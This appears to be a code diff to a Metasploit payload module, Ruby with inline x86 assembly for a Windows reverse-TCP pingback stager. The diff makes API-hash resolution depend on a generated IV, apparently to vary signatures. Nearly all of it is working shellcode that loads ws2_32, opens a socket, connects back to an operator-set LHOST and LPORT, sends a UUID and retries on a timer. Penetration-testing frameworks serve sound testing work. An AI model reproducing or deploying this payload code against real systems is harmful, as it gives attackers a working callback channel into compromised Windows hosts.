@@ -40,6 +40,7 @@ module MetasploitModule
   end
 
   def generate(_opts = {})
+    block_api_iv # ensure the block API IV is generated before we generate the shellcode so that the hashes are correct
     encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack1('N')
     encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack1('V')
     retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max
@@ -62,7 +63,7 @@ module MetasploitModule
           push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.
           push 'ws2_'             ; ...
           push esp                ; Push a pointer to the "ws2_32" string on the stack.
-          push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+          push #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
           mov eax, ebp
           call eax                ; LoadLibraryA( "ws2_32" )
 
@@ -70,7 +71,7 @@ module MetasploitModule
           sub esp, eax            ; alloc some space for the WSAData structure
           push esp                ; push a pointer to this struct
           push eax                ; push the wVersionRequested parameter
-          push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
+          push #{block_api_hash('ws2_32.dll', 'WSAStartup')}
           call ebp                ; WSAStartup( 0x0190, &WSAData );
 
         set_address:
@@ -89,7 +90,7 @@ module MetasploitModule
           push eax                ; push SOCK_STREAM
           inc eax                 ;
           push eax                ; push AF_INET
-          push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
+          push #{block_api_hash('ws2_32.dll', 'WSASocketA')}
           call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
           xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
 
@@ -97,7 +98,7 @@ module MetasploitModule
           push 16                 ; length of the sockaddr struct
           push esi                ; pointer to the sockaddr struct
           push edi                ; the socket
-          push #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
+          push #{block_api_hash('ws2_32.dll', 'connect')}
           call ebp                ; connect( s, &sockaddr, 16 );
 
           test eax,eax            ; non-zero means a failure
@@ -119,13 +120,13 @@ module MetasploitModule
           db #{uuid_as_db}  ; PINGBACK_UUID
         get_pingback_address:
           push edi               ; saved socket
-          push #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
+          push #{block_api_hash('ws2_32.dll', 'send')}
           call ebp               ; call send
 
         cleanup_socket:
           ; clear up the socket
           push edi                ; socket handle
-          push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
+          push #{block_api_hash('ws2_32.dll', 'closesocket')}
           call ebp                ; closesocket(socket)
         ^
     if pingback_count > 0
@@ -136,7 +137,7 @@ module MetasploitModule
           dec [esi+12]
           sleep:
             push #{pingback_sleep * 1000}
-            push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
+            push #{block_api_hash('kernel32.dll', 'Sleep')}
             call ebp                  ;sleep(pingback_sleep * 1000)
             jmp create_socket
         ^
